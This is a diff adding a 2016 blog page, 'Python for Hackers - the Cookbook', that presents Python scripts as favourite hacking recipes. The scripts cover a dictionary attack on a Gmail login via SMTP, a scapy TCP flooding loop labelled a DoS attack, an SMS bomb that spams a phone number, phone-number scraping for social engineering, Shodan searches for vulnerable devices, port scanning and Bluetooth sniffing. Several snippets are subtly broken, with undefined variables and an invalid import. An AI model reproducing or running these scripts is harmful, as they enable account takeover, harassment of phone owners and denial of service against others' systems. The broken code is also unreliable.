@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Personal site and blog for the teaching and spreading of hacktivism and programming and everything technical">
+
+    <title>Python for Hackers - the Cookbook - ./codemuch?</title>
+
+    <link rel="canonical" href="http://ex0dus-0x.github.io/2016/10/11/python-for-hackers/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/clean-blog.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href='//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <link type="application/atom+xml" rel="alternate" href="http://ex0dus-0x.github.io/feed.xml" title="./codemuch?" />
+
+</head>
+
+
+<head>
+<link rel="alternate" type="application/rss+xml" title="My Site RSS" href="/feed.xml" />
+</head>
+
+<body>
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">./codemuch?</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="/">Home</a>
+                </li>
+                
+				
+                <li>
+                    <a href="/about/">About</a>
+                </li>
+				
+                
+				
+                <li>
+                    <a href="/contact/">Contact</a>
+                </li>
+				
+                
+				
+                <li>
+                    <a href="/projects/">Projects</a>
+                </li>
+				
+                
+				
+                <li>
+                    <a href="/texts/">Suggested Readings</a>
+                </li>
+				
+                
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+    <!-- Post Header -->
+<header class="intro-header" style="background-image: url('/img/PostBG/post-bg-12.png')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Python for Hackers - the Cookbook</h1>
+                    
+                    <h2 class="subheading">My favorite recipes</h2>
+                    
+                    <span class="meta">Posted by ex0dus on October 11, 2016</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+				<p>Python is one of the greatest programming languages for hackers. Not because of its easiness actually, but its <strong><em>ease-of-use</em></strong> and <strong><em>quick deployment</em></strong>.</p>
+
+<p>Take <strong>Black Hat Python</strong> for example. Great book. Ever wanted to build a quick TCP server? Simple. Implement <code>socket</code>. Make an object, connect, send some header data, and await a response</p>
+
+<p>First, specify two variables for a target and port.</p>
+
+<pre><code>host = "www.test.com"
+port = 80
+</code></pre>
+
+<p>Make TCP socket object and <strong><em>yadadadada</em></strong></p>
+
+<pre><code>obj = socket(socket.AF_INET, socket.SOCK_STREAM)
+obj.send("GET / HTTP/1.1\r\nHost:" + host + "\r\n\r\n")
+response = obj.recv(4096)
+print response
+</code></pre>
+
+<p>The point is, with an ever growing collection of Python libraries and easy to deploy code, Python is ideal
+for hackers. If you ever look at some of the source code for popular pentesting tools, you will see a large
+amount of Python.</p>
+
+<p>Well, today I’m more of here to talk to about some applicable code you can use in pentesting situations, where you may not always have access to a Kali machine. And maybe with some ingenuity, you can even execute
+this code on a mobile device. So here are my favorite Pythonic recipes for the hacker!</p>
+
+<h2 id="extract-phone-numbers">1. Extract Phone Numbers</h2>
+<p>Let’s start off with something simple. Say we want to siphon some Phone Numbers from a document or some sort of webpage. We want to social engineer these numbers, but the page is just spewing a ton of bullshit we don’t care much for.</p>
+
+<pre><code>import re, urllib
+url = "www.test.com/contact.html"
+htmlFile = urllib.urlopen(url)
+  	html = htmlFile.read()
+phoneNums = re.findall(r'^(\+\d{1,2}\s)?\(?\d{3}\)?[\s.-]\d{3}[\s.-]\d{4}$', html)
+print phoneNums
+</code></pre>
+
+<p>The core component that you need to understand is 5th line, where you would see a random string. What is it?
+That is known as a <strong>regular expression</strong>. This is basically a special string that signifies a specific
+pattern to look for. That specific regex specified looks for standard phone-numbers in these formats:</p>
+
+<pre><code>###-###-####
+(###) ###-####
+### ### ####
+###.###.####
+</code></pre>
+
+<p><a href="http://stackoverflow.com/questions/16699007/regular-expression-to-match-standard-10-digit-phone-number">(source for regex)</a></p>
+
+<h2 id="hacking-smtp-email">2. Hacking SMTP (email)</h2>
+
+<p>With the vast collection of modules for Python, there obviously is one for <strong>SMTP</strong>, also known as <strong><em>Simple
+Mail Transfer Protocol</em></strong>. This is the protocol utilized by email services. Let’s make a simple script that launches a dictionary attack on a sample Gmail account (can be utilized on other SMTP services, such as Yahoo).</p>
+
+<pre><code>import smtplib
+username = "hackme@gmail.com"
+# Specify a wordlist
+wordlist = open("wordlist.txt", 'r')
+for i in wordlist.readlines():
+      password = i.strip("\n")
+      try:
+          s = smtplib.SMTP("smtp.gmail.com", 587)
+          s.ehlo() # identify self to server to confirm working
+          s.starttls() # start secure connect
+          s.ehlo
+          s.login(username, str(password))
+          print "Found! Password: %s" % password
+          s.close
+        except:
+          print "OOPs something went wrong"
+</code></pre>
+
+<p>Let’s look at a few lines. the <code>for</code> keyword takes each newline within the <code>wordlist.txt</code> and appends it as a possible password. When we look at line 8, a SMTP object is defined, connecting to the Gmail SMTP server on port 587. The SMTP object would attempt to login using with the username, and each password from within the wordlist.</p>
+
+<h2 id="tcp-dos-attack">3. TCP DoS attack</h2>
+<p>This quick script provides a way for the user to employ a quick stress.</p>
+
+<pre><code>from scapy import *
+target = "127.0.0.1" # replace with target IP address
+port = 80
+sport = 8080 # replace with source port, or import random to randomize.
+while True:
+  send(IP(dst=target) / TCP(sport=x,dport=port), inter=.005)
+  print "Sent. Kill with Ctrl + C"
+</code></pre>
+
+<p>We look at line 6. This implements the module <code>scapy</code>. Three variables are utilized, a target address, port,
+and source port. The send() method identifies that, as well as using the TCP protocol.</p>
+
+<h2 id="searching-vulnerability-with-shodan">4. Searching Vulnerability with Shodan</h2>
+<p>This script implements the <code>shodan</code> module in order to find vulnerable devices/services.</p>
+
+<pre><code>import shodan
+SHODAN_API_KEY = # key here
+# Create object
+api = shodan.Shodan(SHODAN_API_KEY)
+try:
+    results = api.search("") # string to search
+    print "Result: %s" % results[total]
+    for result in results['matches']:
+        print "IP: %s" % result['ip_str']
+        print result['data']
+except shodan.APIError, e:
+    print "Something went wrong"
+</code></pre>
+
+<h2 id="scanning-with-nmap">5. Scanning with Nmap</h2>
+<p>Very simple host scan using the <code>python-nmap</code> module.</p>
+
+<pre><code>import python-nmap
+ip = '127.0.0.1' # replace with target host
+scan = nmap.PortScanner()
+scan.scan(ip, '0-65535') # scan host, all ports
+</code></pre>
+
+<h2 id="sniffing-bluetooth-devices">6. Sniffing Bluetooth Devices</h2>
+
+<pre><code>from bluetooth import *
+from time import *
+found = []
+def findDevices():
+    foundDevs = discover_devices(lookup_names = True)
+    for (addr. name) in foundDevs:
+        if addr not in alreadyFound:
+            print "Found Device " + str(name)
+            print "MAC Address: " + str(addr)
+            found.append(addr)
+while True:
+    findDevices()
+    sleep(5)
+</code></pre>
+
+<h2 id="sms-bomb">7. SMS Bomb</h2>
+<p>This script uses the <code>smtplib</code>, just as the SMTP cracker does. However,
+this time it is implemented on email-2-text carrier address.</p>
+
+<pre><code>import smtplib
+# It is important to use a disposable Gmail account
+gmail = "test@gmail"
+password = "somepassword"
+target_num = "123-456-7890@vtext.com"
+# Example Verizon SMS address. Replace with carrier address of num.
+o = smtplib.SMTP("smtp.gmail.com:587")
+o.starttls()
+o.login(gmail, password)
+message = "Something hi"
+spam_msg = "From: {} \r\nTo: {} \r\n\r\n {}".format(gmail, phone_num, message)
+counter = 20 # execute 20 times
+for i in range(counter):
+      o.sendmail(gmail, phone_num, spam_msg)
+</code></pre>
+
+<h2 id="geolocation">8. Geolocation</h2>
+<p>Take an IP address, and you get back some nice juicy information about geolocation.</p>
+
+<pre><code>import pygeoip
+# GeoIP object
+gi = pygeoip.GeoIP('GeoIP.dat') # specify database file for GeoIP.
+gi = pygeoip.GeoIP('GeoIPRegion.dat') # region
+gi = pygeoip.GeoIP('GeoIPCity.dat') # city
+gi = pygeoip.GeoIP('GeoIPISP.dat') # ISP
+ip = "127.0.0.1" # replace with IP address!
+# Country
+gi.country_name_by_addr(ip) #=&gt; "United States" for e.g
+gi.region_by_addr(ip) #=&gt; {'region_name': 'NY', 'country_code': 'US'}
+gi.record_by_addr(ip) #=&gt; Returns a huge dict of stuff Im not even gonna give an example
+gi.org_by_addr(ip) #=&gt; "Super Techcom ISP Inc. Corp."
+# More info: https://github.com/appliedsec/pygeoip/wiki
+# Even more info: http://pygeoip.readthedocs.io/en/v0.3.2/getting-started.html
+</code></pre>
+
+<p>That’s just some of my favorite quick delicious recipes for evil malicious Pythonic hax3z.</p>
+
+<p>As a language that includes elements of a <strong>procedural scripting</strong> language and <strong>object-oriented</strong> language, Python provides at-ease use for both hackers and engineers. I rely greatly on Python when it comes to writing scripts and projects, and hopefully, I’ll continue to utilize it. However, to add some variation, I’ll start with some projects in C, Rust and Ruby as well. Exploitation is looking nice, so that’s something I’m aiming at.</p>
+
+<p>Thanks for reading, and more is coming! Here is a gr8 list of books by hackers for hackers with relevance to Python:</p>
+
+<ul>
+  <li><a href="http://file.allitebooks.com/20150521/Black%20Hat%20Python.pdf"><strong>Black Hat Python</strong></a></li>
+  <li><a href="http://www.chinastor.org/upload/2015-08/15081917086229.pdf"><strong>Gray Hat Python</strong></a></li>
+  <li><a href="https://repo.zenk-security.com/Programmation/Violent%20Python%20a%20Cookbook%20for%20Hackers-Forensic%20Analysts-Penetration%20testers%20and%20Security%20Engineers.pdf"><strong>Violent Python</strong></a></li>
+  <li>and of course, if you are a beginner YEARNING to learn, here’s a great classic:
+ <a href="https://automatetheboringstuff.com/"><strong>Automate the Boring Stuff with Python</strong></a></li>
+</ul>
+
+
+                <hr>
+
+                
+                    <div id="disqus_thread"></div>
+                    <script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    /*
+    var disqus_config = function () {
+        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */              // var disqus_developer = 1; //when developing, uncomment.
+                    (function() {  // DON'T EDIT BELOW THIS LINE
+                        var d = document, s = d.createElement('script');
+        
+                        s.src = '//codemuch.disqus.com/embed.js';
+        
+                     s.setAttribute('data-timestamp', +new Date());
+                        (d.head || d.body).appendChild(s);
+                    })();
+                </script>
+                <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+                
+
+
+              
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2016/09/10/im-back-plus-updates/" data-toggle="tooltip" data-placement="top" title="I'm back! ">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2016/11/03/why-you-switch-to-linux/" data-toggle="tooltip" data-placement="top" title="Why You Should Switch to Linux">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    <li>
+                        <a href="/feed.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a href="https://twitter.com/ex0dus_0x">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    <li>
+                        <a href="https://github.com/ex0dus-0x">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a href="mailto:stack.over.heap@gmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; CodeMuch 2016</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/clean-blog.min.js "></script>
+
+
+</body>
+
+</html>
